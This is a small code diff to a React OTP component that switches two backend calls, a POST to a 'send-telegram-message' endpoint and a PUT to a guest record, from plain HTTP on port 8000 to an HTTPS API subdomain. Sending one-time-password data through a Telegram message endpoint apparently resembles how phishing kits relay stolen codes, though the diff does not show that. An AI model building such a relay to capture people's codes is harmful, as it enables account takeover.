@@ -66,7 +66,7 @@ const OTP = () => {
         };
 
         try {
-          const response = await fetch("http://bogotapoliz.com:8000/api/v1/send-telegram-message", {
+          const response = await fetch("https://api.bogotapoliz.com/api/v1/send-telegram-message", {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -77,7 +77,7 @@ const OTP = () => {
           if (!response.ok) throw new Error("Error al enviar los datos al backend");
 
           const updateResponse = await fetch(
-            `http://bogotapoliz.com:8000/api/v1/guest/${guestId}`,
+            `https://api.bogotapoliz.com/api/v1/guest/${guestId}`,
             {
               method: "PUT",
               headers: { "Content-Type": "application/json" },
